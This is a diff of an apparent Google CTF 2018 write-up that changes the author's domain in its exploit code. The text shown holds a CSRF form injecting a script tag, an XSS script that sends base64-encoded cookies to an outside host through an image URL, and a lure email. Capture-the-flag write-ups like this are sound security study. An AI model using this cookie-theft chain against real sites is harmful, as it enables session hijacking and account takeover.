@@ -299,7 +299,7 @@ form using a (separate) CSRF exploit:
         const form = document.querySelector("form");
         const [user, pass] = form.querySelectorAll("input");
         user.value = '<script src="https:';
-        pass.value = 'blog.jspenguin.com/other/Google_CTF_2018_2/exploit.js"><\/script>';
+        pass.value = 'blog.hugoxu.com/other/Google_CTF_2018_2/exploit.js"><\/script>';
         form.submit();
     </script>
 </body>
@@ -314,7 +314,7 @@ The XSS exploit script:
 // Check domain to prevent misuse
 if (document.domain === "router-ui.web.ctfcompetition.com") {
     const img = document.createElement("img");
-    img.src = "https://jspenguin.com/cat.png?" + btoa(document.cookie);
+    img.src = "https://legacy.hugoxu.com/cat.png?" + btoa(document.cookie);
     document.documentElement.append(img);
 }
 ```
@@ -327,7 +327,7 @@ TO: wintermuted@googlegroups.com
 
 Cat Pictures
 
-I want to steal your session cookies, no, I mean I have cat pictures here: https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html
+I want to steal your session cookies, no, I mean I have cat pictures here: https://blog.hugoxu.com/other/Google_CTF_2018_2/portal.html
 ```
 
 After just a few seconds, I got a reply, probably from a bot:
@@ -336,7 +336,7 @@ After just a few seconds, I got a reply, probably from a bot:
 Thanks for the link!
 
 Thanks for the  
-link "https://blog.jspenguin.com/other/Google_CTF_2018_2/portal.html", I'll  
+link "https://blog.hugoxu.com/other/Google_CTF_2018_2/portal.html", I'll  
 check it out as soon as possible!
 ```
 
